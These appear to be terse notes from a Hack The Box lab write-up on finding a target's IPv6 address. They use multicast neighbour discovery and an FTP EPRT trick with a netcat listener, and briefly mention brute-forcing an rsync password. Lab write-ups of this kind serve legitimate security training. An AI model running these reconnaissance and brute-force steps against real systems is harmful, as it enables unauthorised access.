At one step we need to find the ipv6 of target, based on hints scattered around the main webpage/ftp

some ipv6 tricks - multicast find neighbors

log into a htb box  
find the ipv6 from ip addr   
ping6 -I <ipv6 addr of box> ff02::1  
ip -6 neigh  
  
intended route - with fxp msg (https://tools.ietf.org/html/rfc2428)  
  
nc 10.10.10.156 21  
user <32 a>  
pass <32 a>  
EPRT |2|dead:beef:2::<value>|2222  
  
in another window start listener on ipv6  
nc -6 -lvp 2222  
  
then issue a LIST command - we should see the ipv6 of the box    
  
rsync bruteforce is a cruddy python script - just takes in 8 char pws and issues rsync commands until we find the password to get to next step

